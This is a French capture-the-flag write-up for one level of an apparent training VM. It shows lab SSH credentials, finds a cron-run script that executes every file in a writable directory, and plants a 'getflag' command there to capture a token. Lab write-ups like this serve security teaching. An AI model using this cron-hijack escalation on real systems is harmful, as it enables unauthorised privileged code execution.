# Level05

Se connecter en tant que `level05`:

    $ ssh 192.168.1.124 -p 4242 -l level05
    level05@192.168.1.124's password: ne2searoevaevoem4ov4ar8ap

---

Premiere étape de recherche

	$ ls -la
	(nothing)

	$ find / -user level05 2> /dev/null
	(nothing)

	$ find / -user flag05 2> /dev/null
	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver

	$ ls -l /usr/sbin/openarenaserver; ls -l /rofs/usr/sbin/openarenaserver
	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
	-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

Nous n'avons pas les droits de base mais une ACL sur le premier fichier étend ses droits unix. Nous pouvons donc le lire

```shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le script execute tous les fichiers qui sont dans /opt/openarenaserver/ puis les supprime

	$ echo "getflag" > /opt/openarenaserver/script.sh

	$ /usr/sbin/openarenaserver
	bash: /usr/sbin/openarenaserver: Permission denied

On ne peut pas executer le script nous meme, il y a surement un cron qui le fait regulierement

	$ ls /opt/openarenaserver/
	(nothing)

Confirmation, le script n'y est plus

On va le modifier pour qu'il écrive le résultat dans un fichier

	$ echo "getflag > /tmp/flagg" > /opt/openarenaserver/script.sh

On attends

	$ cat /tmp/flagg
	Check flag.Here is your token : viuaaale9huek52boumoomioc
